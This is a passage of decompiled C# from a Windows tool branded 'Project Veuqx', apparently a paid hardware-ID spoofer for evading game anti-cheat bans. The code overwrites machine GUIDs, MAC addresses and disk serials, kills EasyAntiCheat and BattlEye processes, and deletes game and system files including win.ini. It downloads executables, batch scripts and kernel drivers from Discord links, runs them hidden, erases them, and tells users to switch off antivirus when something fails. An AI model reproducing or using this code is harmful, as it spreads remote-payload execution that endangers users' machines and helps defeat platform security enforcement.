				bool flag = (uint)this.NetworkAdapter.InvokeMethod("Disable", null) == 0U;
				if (flag)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
			return false;
		}

		// Token: 0x0600005F RID: 95 RVA: 0x00005080 File Offset: 0x00005080
		private bool EnableNetworkDriver()
		{
			try
			{
				bool flag = (uint)this.NetworkAdapter.InvokeMethod("Enable", null) == 0U;
				if (flag)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
			return false;
		}

		// Token: 0x06000060 RID: 96 RVA: 0x000050D0 File Offset: 0x000050D0
		public static List<string> GetDeviceIDs()
		{
			List<string> list = new List<string>();
			for (int i = 0; i <= 9999; i++)
			{
				string text = Main.GenerateID(i);
				RegistryKey registryKey = Main.NetworkClass.OpenSubKey(text);
				bool flag = registryKey != null;
				if (!flag)
				{
					break;
				}
				list.Add(text);
			}
			return list;
		}

		// Token: 0x06000061 RID: 97 RVA: 0x00005130 File Offset: 0x00005130
		public static string GetDriverDescByID(string id)
		{
			return Main.NetworkClass.OpenSubKey(id).GetValue("DriverDesc").ToString();
		}

		// Token: 0x06000062 RID: 98 RVA: 0x0000515C File Offset: 0x0000515C
		public Main(string DeviceID)
		{
			string[,] array = new string[6, 7];
			array[0, 0] = "SystemProductName";
			array[0, 1] = "Identifier";
			array[0, 2] = "Previous Update Revision";
			array[0, 3] = "ProcessorNameString";
			array[0, 4] = "VendorIdentifier";
			array[0, 5] = "Platform Specific Field1";
			array[0, 6] = "Component Information";
			array[1, 0] = "SerialNumber";
			array[1, 1] = "Identifier";
			array[1, 2] = "SystemManufacturer";
			array[1, 3] = "nop";
			array[1, 4] = "nop";
			array[1, 5] = "nop";
			array[1, 6] = "nop";
			array[2, 0] = "ComputerHardwareId";
			array[2, 1] = "ComputerHardwareIds";
			array[2, 2] = "BIOSVendor";
			array[2, 3] = "ProductId";
			array[2, 4] = "ProcessorNameString";
			array[2, 5] = "BIOSReleaseDate";
			array[2, 6] = "nop";
			array[3, 0] = "ProductId";
			array[3, 1] = "InstallDate";
			array[3, 2] = "InstallTime";
			array[3, 3] = "nop";
			array[3, 4] = "nop";
			array[3, 5] = "nop";
			array[3, 6] = "nop";
			array[4, 0] = "SusClientId";
			array[4, 1] = "nop";
			array[4, 2] = "nop";
			array[4, 3] = "nop";
			array[4, 4] = "nop";
			array[4, 5] = "nop";
			array[4, 6] = "nop";
			array[5, 0] = "BaseBoardManufacturer";
			array[5, 1] = "BaseBoardProduct";
			array[5, 2] = "BIOSVersion";
			array[5, 3] = "nop";
			array[5, 4] = "SystemManufacturer";
			array[5, 5] = "SystemProductName";
			array[5, 6] = "nop";
			this.ValuesKeysHWID = array;
			this.processlist = new List<Process>();
			this.components = null;
			
			this.DriverDesc = Main.GetDriverDescByID(DeviceID);
			this.Device = DeviceID;
			this.NetworkInterface = Main.NetworkClass.OpenSubKey(DeviceID, true);
			this.NetworkAdapter = new ManagementObjectSearcher("select * from win32_networkadapter where Name='" + this.DriverDesc + "'").Get().Cast<ManagementObject>().FirstOrDefault<ManagementObject>();
		}

		// Token: 0x06000063 RID: 99 RVA: 0x00005450 File Offset: 0x00005450
		public bool Spoof(string MAC)
		{
			bool flag = this.DisableNetworkDriver();
			bool result;
			if (flag)
			{
				result = false;
			}
			else
			{
				this.NetworkInterface.SetValue("NetworkAddress", MAC, RegistryValueKind.String);
				bool flag2 = this.EnableNetworkDriver();
				result = !flag2;
			}
			return result;
		}

		// Token: 0x06000064 RID: 100 RVA: 0x00005494 File Offset: 0x00005494
		public bool Spoof()
		{
			bool flag = !this.DisableNetworkDriver();
			bool result;
			if (flag)
			{
				result = false;
			}
			else
			{
				this.NetworkInterface.SetValue("NetworkAddress", Main.GenerateRandomMAC(), RegistryValueKind.String);
				bool flag2 = !this.EnableNetworkDriver();
				result = !flag2;
			}
			return result;
		}

		// Token: 0x06000065 RID: 101 RVA: 0x000054E0 File Offset: 0x000054E0
		public bool Reset()
		{
			bool flag = !this.DisableNetworkDriver();
			bool result;
			if (flag)
			{
				result = false;
			}
			else
			{
				this.NetworkInterface.DeleteValue("NetworkAddress");
				bool flag2 = !this.EnableNetworkDriver();
				result = !flag2;
			}
			return result;
		}

		// Token: 0x06000066 RID: 102 RVA: 0x00005526 File Offset: 0x00005526
		private void guna2Button18_Click(object sender, EventArgs e)
		{
			this.Spoof();
			Main.GenerateID(0);
			Main.GenerateRandomMAC();
			MessageBox.Show("New Mac: " + Main.GenerateRandomMAC());
		}

		// Token: 0x06000067 RID: 103 RVA: 0x00005554 File Offset: 0x00005554
		public static void SpoofGUID()
		{
			string value = Guid.NewGuid().ToString();
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
			registryKey = registryKey.OpenSubKey("SOFTWARE\\Microsoft\\Cryptography", true);
			registryKey.SetValue("MachineGuid", value);
		}

		// Token: 0x06000068 RID: 104 RVA: 0x000055A0 File Offset: 0x000055A0
		public static string CurrentGUID()
		{
			string text = "SOFTWARE\\Microsoft\\Cryptography";
			string text2 = "MachineGuid";
			string result;
			using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
			{
				using (RegistryKey registryKey2 = registryKey.OpenSubKey(text))
				{
					bool flag = registryKey2 == null;
					if (flag)
					{
						throw new KeyNotFoundException(string.Format("Key Not Found: {0}", text));
					}
					object value = registryKey2.GetValue(text2);
					bool flag2 = value == null;
					if (flag2)
					{
						throw new IndexOutOfRangeException(string.Format("Index Not Found: {0}", text2));
					}
					result = value.ToString();
				}
			}
			return result;
		}

		// Token: 0x06000069 RID: 105 RVA: 0x00005664 File Offset: 0x00005664
		private void guna2Button25_Click_1(object sender, EventArgs e)
		{
			string value = Guid.NewGuid().ToString();
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
			registryKey = registryKey.OpenSubKey("SOFTWARE\\Microsoft\\Cryptography", true);
			registryKey.SetValue("MachineGuid", value);
			MessageBox.Show("New GUID 1: " + Main.CurrentGUID());
		}

		// Token: 0x0600006A RID: 106 RVA: 0x000056C5 File Offset: 0x000056C5
		private void guna2Panel1_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x0600006B RID: 107 RVA: 0x000056C8 File Offset: 0x000056C8
		public static string randstring(int length)
		{
			return new string((from s in Enumerable.Repeat<string>("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", length)
			select s[Main.rndhwid.Next(s.Length)]).ToArray<char>());
		}

		// Token: 0x0600006C RID: 108 RVA: 0x00005714 File Offset: 0x00005714
		private void spoofRegistryKey(int regKeyIndex)
		{
			for (int i = 0; i < this.ValuesKeysHWID.GetLength(1); i++)
			{
				bool flag = this.ValuesKeysHWID[regKeyIndex, i] == "nop";
				if (flag)
				{
					break;
				}
			}
		}

		// Token: 0x0600006D RID: 109 RVA: 0x0000575C File Offset: 0x0000575C
		private void guna2Button4_Click(object sender, EventArgs e)
		{
			this.spoofRegistryKey(0);
			MessageBox.Show("Successfully", "Project Veuqx", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x0600006E RID: 110 RVA: 0x0000577A File Offset: 0x0000577A
		private void log1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600006F RID: 111 RVA: 0x0000577D File Offset: 0x0000577D
		private void guna2Panel3_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x06000070 RID: 112 RVA: 0x00005780 File Offset: 0x00005780
		public void CleanHKeys()
		{
			Guid guid = Guid.NewGuid();
			using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software", true))
			{
				foreach (string text in registryKey.GetSubKeyNames())
				{
					bool flag = text == "Blizzard Entertainment";
					if (flag)
					{
						registryKey.DeleteSubKeyTree(text);
					}
				}
				registryKey.Close();
			}
			using (RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\IDConfigDB\\Hardware Profiles\\0001", true))
			{
				bool flag2 = registryKey2 != null;
				if (flag2)
				{
					string identity = Environment.UserDomainName + "\\" + Environment.UserName;
					RegistrySecurity registrySecurity = new RegistrySecurity();
					registrySecurity.AddAccessRule(new RegistryAccessRule(identity, RegistryRights.FullControl, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Allow));
					registryKey2.SetAccessControl(registrySecurity);
					RegistryKey registryKey3 = registryKey2;
					string name = "HwProfileGuid";
					string str = "{";
					Guid guid2 = guid;
					registryKey3.SetValue(name, str + guid2.ToString() + "}", RegistryValueKind.String);
					registryKey2.Close();
				}
			}
			using (RegistryKey registryKey4 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Cryptography", true))
			{
				bool flag3 = registryKey4 != null;
				if (flag3)
				{
					string identity2 = Environment.UserDomainName + "\\" + Environment.UserName;
					RegistrySecurity registrySecurity2 = new RegistrySecurity();
					registrySecurity2.AddAccessRule(new RegistryAccessRule(identity2, RegistryRights.FullControl, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Allow));
					registryKey4.SetAccessControl(registrySecurity2);
					registryKey4.SetValue("MachineGuid", guid, RegistryValueKind.String);
					registryKey4.Close();
				}
			}
			MessageBox.Show("Successfully", "Project Veuqx", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x06000071 RID: 113 RVA: 0x00005960 File Offset: 0x00005960
		private void guna2Button28_Click(object sender, EventArgs e)
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			string processName = "Steam";
			Process process = Process.GetProcessesByName(processName).FirstOrDefault<Process>();
			bool flag = process != null;
			if (flag)
			{
				process.CloseMainWindow();
				process.Kill();
				process.WaitForExit();
				process.Dispose();
			}
			this.spoofRegistryKey(0);
			this.Spoof();
			Main.GenerateID(0);
			Main.GenerateRandomMAC();
			Main.SpoofGUID();
			this.CleanHKeys();
		}

		// Token: 0x06000072 RID: 114 RVA: 0x000059D8 File Offset: 0x000059D8
		private void guna2Button36_Click(object sender, EventArgs e)
		{
			this.cursor.Height = this.guna2Button36.Height;
			this.cursor.Top = this.guna2Button36.Top;
			this.dash.Show();
			this.system.Hide();
			this.game.Hide();
			this.settings.Hide();
			this.fivem.Hide();
			this.games.Hide();
			this.systeme.Hide();
			this.logs.Hide();
			this.discord.Hide();
		}

		// Token: 0x06000073 RID: 115 RVA: 0x00005A80 File Offset: 0x00005A80
		private void guna2Button35_Click(object sender, EventArgs e)
		{
			this.cursor.Height = this.guna2Button35.Height;
			this.cursor.Top = this.guna2Button35.Top;
			this.dash.Hide();
			this.system.Hide();
			this.game.Show();
			this.settings.Hide();
			this.fivem.Hide();
			this.games.Hide();
			this.systeme.Hide();
			this.logs.Show();
			this.discord.Hide();
		}

		// Token: 0x06000074 RID: 116 RVA: 0x00005B28 File Offset: 0x00005B28
		private void guna2Button34_Click(object sender, EventArgs e)
		{
			this.cursor.Height = this.guna2Button34.Height;
			this.cursor.Top = this.guna2Button34.Top;
			this.dash.Hide();
			this.system.Hide();
			this.game.Show();
			this.settings.Hide();
			this.fivem.Hide();
			this.games.Hide();
			this.systeme.Hide();
			this.logs.Hide();
			this.discord.Hide();
		}

		// Token: 0x06000075 RID: 117 RVA: 0x00005BD0 File Offset: 0x00005BD0
		private void guna2Button30_Click(object sender, EventArgs e)
		{
			Process.Start("https://www.youtube.com/channel/UCG972G91QodFW4HRANosuNQ/videos");
		}

		// Token: 0x06000076 RID: 118 RVA: 0x00005BDE File Offset: 0x00005BDE
		private void settings_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x06000077 RID: 119 RVA: 0x00005BE4 File Offset: 0x00005BE4
		private void guna2Button31_Click_1(object sender, EventArgs e)
		{
			this.cursor.Height = this.guna2Button31.Height;
			this.cursor.Top = this.guna2Button31.Top;
			this.settings.Show();
			this.dash.Hide();
			this.system.Hide();
			this.game.Hide();
			this.fivem.Hide();
			this.games.Hide();
			this.logs.Hide();
			this.discord.Hide();
			this.systeme.Hide();
		}

		// Token: 0x06000078 RID: 120 RVA: 0x00005C8C File Offset: 0x00005C8C
		private void guna2Button1_Click(object sender, EventArgs e)
		{
			this.cursor.Height = this.guna2Button1.Height;
			this.cursor.Top = this.guna2Button1.Top;
			this.dash.Hide();
			this.system.Hide();
			this.game.Hide();
			this.settings.Hide();
			this.games.Hide();
			this.logs.Hide();
			this.discord.Hide();
			this.fivem.Show();
		}

		// Token: 0x06000079 RID: 121 RVA: 0x00005D28 File Offset: 0x00005D28
		private void guna2Button3_Click(object sender, EventArgs e)
		{
			try
			{
				WebClient webClient = new WebClient();
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/903055918223200309/909254201786368030/Apex.bat", "C:\\Windows\\Drive\\APX.bat");
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/903055918223200309/909258244109774898/DBCLN.exe", "C:\\Windows\\Drive\\DBCLN.exe");
				new Process
				{
					StartInfo = 
					{
						FileName = "C:\\Windows\\Drive\\APX.bat",
						//FileName = "C:\\Windows\\Drive\\DBCLN.exe",
						WindowStyle = ProcessWindowStyle.Hidden
					}
				}.Start();
				Task.Delay(1000);
				this.Spoof();
				Main.SpoofGUID();
				Main.GenerateRandomMAC();
				Main.HWIDclick();
				Main.XBOXclick();
				Main.PC();
				Main.Diskclick();
				MessageBox.Show("Successfully", "Project Veuqx", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			}
			catch (Exception)
			{
				MessageBox.Show("Turn your antivirus off?", "Project Veuqx", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		// Token: 0x0600007A RID: 122 RVA: 0x00005E10 File Offset: 0x00005E10
		private void guna2Button2_Click(object sender, EventArgs e)
		{
			this.Spoof();
			Main.SpoofGUID();
			this.spoofRegistryKey(0);
			Main.GenerateRandomMAC();
			MessageBox.Show("Successfully", "Project Veuqx", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x0600007B RID: 123 RVA: 0x00005E44 File Offset: 0x00005E44
		public static void XI0awLDj2UyO(int regKeyIndex)
		{
			int num = 0;
			while (num < Main.sOPIC9JSa8Gu.GetLength(1) && !(Main.sOPIC9JSa8Gu[regKeyIndex, num] == "nop"))
			{
				Main.IDgenerate = "csAHFjOTRQ4Fz2QFDVYi";
				num++;
			}
		}

		// Token: 0x0600007C RID: 124 RVA: 0x00005E94 File Offset: 0x00005E94
		public static void kt8t5gn6UldO()
		{
			Main.IDgenerate = "TeincVq5Yp6nSsKPvvUu";
		}

		// Token: 0x0600007D RID: 125 RVA: 0x00005EA4 File Offset: 0x00005EA4
		private void guna2Button5_Click(object sender, EventArgs e)
		{
			Main.HWIDclick();
			Main.XBOXclick();
			Main.PC();
			Main.Diskclick();
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.RedirectStandardInput = true;
			process.StartInfo.RedirectStandardError = true;
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.CreateNoWindow = true;
			process.Start();
			process.StandardInput.WriteLine("taskkill /f /im UnrealCEFSubProcess.exe");
			process.StandardInput.WriteLine("taskkill /f /im CEFProcess.exe");
			process.StandardInput.WriteLine("taskkill /f /im EasyAntiCheat.exe");
			process.StandardInput.WriteLine("taskkill /f /im BEService.exe");
			process.StandardInput.WriteLine("taskkill /f /im BEServices.exe");
			process.StandardInput.WriteLine("taskkill /f /im BattleEye.exe");
			process.StandardInput.WriteLine("taskkill /f /im epicgameslauncher.exe");
			process.StandardInput.WriteLine("taskkill /f /im FortniteClient-Win64-Shipping_EAC.exe");
			process.StandardInput.WriteLine("taskkill /f /im FortniteClient-Win64-Shipping.exe");
			process.StandardInput.WriteLine("taskkill /f /im FortniteClient-Win64-Shipping_BE.exe");
			process.StandardInput.WriteLine("taskkill /f /im FortniteLauncher.exe");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\Software\\Epic Games\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Epic Games\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\Software\\Epic Games\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\com.epicgames.launcher\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\EpicGames\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Epic Games\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_CLASSES_ROOT\\com.epicgames.launcher\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\Software\\Epic Games\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Classes\\com.epicgames.launcher\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Epic Games\\Unreal Engine\\Hardware Survey\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Epic Games\\Unreal Engine\\Identifiers\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\com.epicgames.launcher\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\EpicGames\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\SOFTWARE\\EpicGames\" /f");
			process.StandardInput.WriteLine("exit");
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.RedirectStandardInput = true;
			process.StartInfo.RedirectStandardError = true;
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.CreateNoWindow = true;
			process.Start();
			process.StandardInput.WriteLine("taskkill /f /im UnrealCEFSubProcess.exe");
			process.StandardInput.WriteLine("taskkill /f /im CEFProcess.exe");
			process.StandardInput.WriteLine("taskkill /f /im EasyAntiCheat.exe");
			process.StandardInput.WriteLine("taskkill /f /im BEService.exe");
			process.StandardInput.WriteLine("taskkill /f /im BEServices.exe");
			process.StandardInput.WriteLine("taskkill /f /im BattleEye.exe");
			process.StandardInput.WriteLine("taskkill /f /im epicgameslauncher.exe");
			process.StandardInput.WriteLine("taskkill /f /im FortniteClient-Win64-Shipping_EAC.exe");
			process.StandardInput.WriteLine("taskkill /f /im FortniteClient-Win64-Shipping.exe");
			process.StandardInput.WriteLine("taskkill /f /im FortniteClient-Win64-Shipping_BE.exe");
			process.StandardInput.WriteLine("taskkill /f /im FortniteLauncher.exe");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\Software\\Epic Games\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Epic Games\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\Software\\Epic Games\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\com.epicgames.launcher\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\EpicGames\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Epic Games\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_CLASSES_ROOT\\com.epicgames.launcher\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\Software\\Epic Games\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Classes\\com.epicgames.launcher\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Epic Games\\Unreal Engine\\Hardware Survey\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Epic Games\\Unreal Engine\\Identifiers\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\com.epicgames.launcher\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\EpicGames\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\SOFTWARE\\EpicGames\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_USERS\\");
			WebClient webClient = new WebClient();
			string text = "C:\\Windows\\IME\\spoof.sys";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/651522382200176690/660983927883825163/spoofer.sys", text);
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process = Process.Start(text);
			Thread.Sleep(1000);
			process.Close();
			File.Delete(text);
			this.Spoof();
			Main.SpoofGUID();
			this.spoofRegistryKey(0);
			Main.GenerateRandomMAC();
			Main.kt8t5gn6UldO();
			MessageBox.Show("Successfully", "Project Veuqx", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x0600007E RID: 126 RVA: 0x0000639C File Offset: 0x0000639C
		private void guna2Button6_Click_1(object sender, EventArgs e)
		{
			Thread.Sleep(2500);
			foreach (string text in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi").GetSubKeyNames())
			{
				foreach (string text2 in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + text).GetSubKeyNames())
				{
					RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(string.Concat(new string[]
					{
						"HARDWARE\\DEVICEMAP\\Scsi\\",
						text,
						"\\",
						text2,
						"\\Target Id 0\\Logical Unit Id 0"
					}), true);
					bool flag = registryKey != null && registryKey.GetValue("DeviceType").ToString() == "DiskPeripheral";
					if (flag)
					{
						string text3 = Main.RandomId(14);
						string text4 = Main.RandomId(14);
						registryKey.SetValue("DeviceIdentifierPage", Encoding.UTF8.GetBytes(text4));
						registryKey.SetValue("Identifier", text3);
						registryKey.SetValue("InquiryData", Encoding.UTF8.GetBytes(text3));
						registryKey.SetValue("SerialNumber", text4);
					}
				}
				RegistryKey registryKey2 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName", true);
				registryKey2.SetValue("ComputerName", "DESKTOP-" + Main.GenerateString(6));
				registryKey2.Close();
			}
			new Process
			{
				StartInfo = 
				{
					FileName = "cmd.exe",
					CreateNoWindow = true,
					RedirectStandardInput = true,
					RedirectStandardOutput = true,
					UseShellExecute = false,
					Verb = "runas",
					Arguments = "/C del /f \"C:\\Windows\\win.ini\" && del /f \"C:\\Riot Games\\VALORANT\\live\\Manifest_NonUFSFiles_Win64.txt\" && del /f \"C:\\Riot Games\\VALORANT\\live\\Engine\\Binaries\\ThirdParty\\CEF3\\Win64\\icudtl.dat\" && del /f \"C:\\Riot Games\\Riot Client\\UX\\Plugins\\plugin - manifest.json\" && del /f \"C:\\Riot Games\\Riot Client\\UX\\icudtl.dat\" && del /f \"C:\\Riot Games\\Riot Client\\UX\\natives_blob.bin\" && del /f \"C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Vault\\UserProfileRoaming\\Latest.dat\" && del /f \"C:\\Users\\%username%\\AppData\\Local\\AC\\INetCookies\\ESE\\container.dat\" && del /f \"C:\\Users\\%username%\\AppData\\Local\\UnrealEngine\\4.23\\Saved\\Config\\WindowsClient\\Manifest.ini\" && del /f \"C:\\Users\\%username%\\AppData\\Local\\Microsoft\\OneDrive\\logs\\Common\\DeviceHealthSummaryConfiguration.ini\" && del /f \"C:\\ProgramData\\Microsoft\\Windows\\DeviceMetadataCache\\dmrc.idx\" && del /f \"C:\\Users\\%username%\\ntuser.ini\" && del /f \"C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\container.dat\" && del /f \"C:\\System Volume Information\\tracking.log\" && del /f \"D:\\System Volume Information\\tracking.log\""
				}
			}.Start();
			this.Spoof();
			Main.SpoofGUID();
			Main.GenerateRandomMAC();
			Main.HWIDclick();
			Main.XBOXclick();
			Main.PC();
			Main.Diskclick();
			MessageBox.Show("Successfully", "Project Veuqx", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x0600007F RID: 127 RVA: 0x000065D8 File Offset: 0x000065D8
		private void guna2Button34_Click_1(object sender, EventArgs e)
		{
			this.cursor.Height = this.guna2Button34.Height;
			this.cursor.Top = this.guna2Button34.Top;
			this.settings.Hide();
			this.dash.Hide();
			this.system.Hide();
			this.game.Hide();
			this.fivem.Hide();
			this.games.Show();
			this.logs.Hide();
			this.systeme.Hide();
			this.discord.Hide();
		}

		// Token: 0x06000080 RID: 128 RVA: 0x00006680 File Offset: 0x00006680
		private void guna2Button27_Click_1(object sender, EventArgs e)
		{
			MessageBox.Show("You have not Prime access", "Project Veuqx", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			bool flag = Login.KeyAuthApp.user_data.subscriptions[0].subscription == "User";
			if (flag)
			{
				MessageBox.Show("You have not Prime access", "Project Veuqx", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			}
			bool flag2 = Login.KeyAuthApp.user_data.subscriptions[0].subscription == "Founder";
			if (flag2)
			{
				MessageBox.Show("You have not Prime access", "Project Veuqx", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			}
			else
			{
				bool flag3 = Login.KeyAuthApp.user_data.subscriptions[0].subscription == "Prime";
				if (flag3)
				{
					MessageBox.Show("Soming Soon", "Project Veuqx", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				}
			}
		}

		// Token: 0x06000081 RID: 129 RVA: 0x0000675C File Offset: 0x0000675C
		private void guna2Button33_Click(object sender, EventArgs e)
		{
			this.cursor.Height = this.guna2Button33.Height;
			this.cursor.Top = this.guna2Button33.Top;
			this.settings.Hide();
			this.dash.Hide();
			this.game.Hide();
			this.fivem.Hide();
			this.games.Hide();
			this.logs.Hide();
			this.systeme.Hide();
			this.discord.Hide();
		}

		// Token: 0x06000082 RID: 130 RVA: 0x000067F8 File Offset: 0x000067F8
		private void guna2Button32_Click_1(object sender, EventArgs e)
		{
			MessageBox.Show("Coming Soon", "Project Veuqx", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}

		// Token: 0x06000083 RID: 131 RVA: 0x0000680E File Offset: 0x0000680E
		private void systeme_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x06000084 RID: 132 RVA: 0x00006814 File Offset: 0x00006814
		public static void ijefopkwfopijk()
		{
			string path = "C:\\ProgramData\\Temp\\mds\\12-34";
			bool flag = Directory.Exists(path);
			if (flag)
			{
				Directory.Delete(path);
				Directory.CreateDirectory(path);
			}
			bool flag2 = !Directory.Exists(path);
			if (flag2)
			{
				Directory.CreateDirectory(path);
			}
			WebClient webClient = new WebClient();
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/885812006425350194/983368919618322452/AMIDEWINx64.exe", "C:\\ProgramData\\Temp\\mds\\12-34\\AMIDEWINx64.exe");
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/885812006425350194/983368919404408862/amide.sys", "C:\\ProgramData\\Temp\\mds\\12-34\\amide.sys");
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/885812006425350194/983368919194677278/amifldrv64.sys", "C:\\ProgramData\\Temp\\mds\\12-34\\amifldrv64.sys");
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/885812006425350194/985119428414939196/medrousabios.bat", "C:\\ProgramData\\Temp\\mds\\12-34\\medrousabios.bat");
			Process.Start("C:\\ProgramData\\Temp\\mds\\12-34\\medrousabios.bat");
			Thread.Sleep(20000);
			Directory.Delete(path, true);
		}

		// Token: 0x06000085 RID: 133 RVA: 0x000068C0 File Offset: 0x000068C0
		private void guna2Button38_Click_1(object sender, EventArgs e)
		{
			try
			{
				string path = "C:\\ProgramData\\Temp\\ppsad\\00-00";
				bool flag = !Directory.Exists(path);
				if (flag)
				{
					Directory.CreateDirectory(path);
				}
				WebClient webClient = new WebClient();
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/896100225926709343/905929010624753735/AMIDEWINx64.exe", "C:\\ProgramData\\Temp\\ppsad\\00-00\\AMIDEWINx64.exe");
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/896100225926709343/905929002672341013/amide.sys", "C:\\ProgramData\\Temp\\ppsad\\00-00\\amide.sys");
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/896100225926709343/905928994225008651/amifldrv64.sys", "C:\\ProgramData\\Temp\\ppsad\\00-00\\amifldrv64.sys");
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/896100225926709343/905929125229891654/nnnn.bat", "C:\\ProgramData\\Temp\\ppsad\\00-00\\nnnn.bat");
				Process.Start("C:\\ProgramData\\Temp\\ppsad\\00-00\\nnnn.bat");
				Task.Delay(2000);
				MessageBox.Show("Successfully", "Project Veuqx", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			}
			catch (Exception)
			{
				MessageBox.Show("Then antivirus off and try again!", "Project Veuqx", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
			bool flag2 = Directory.Exists("C:\\ProgramData\\Temp\\ppsad\\00-00\\AMIDEWINx64.exe");
			if (flag2)
			{
				Directory.Delete("C:\\ProgramData\\Temp\\ppsad\\00-00\\AMIDEWINx64.exe", true);
			}
			bool flag3 = Directory.Exists("C:\\ProgramData\\Temp\\ppsad\\00-00\\nnnn.bat");
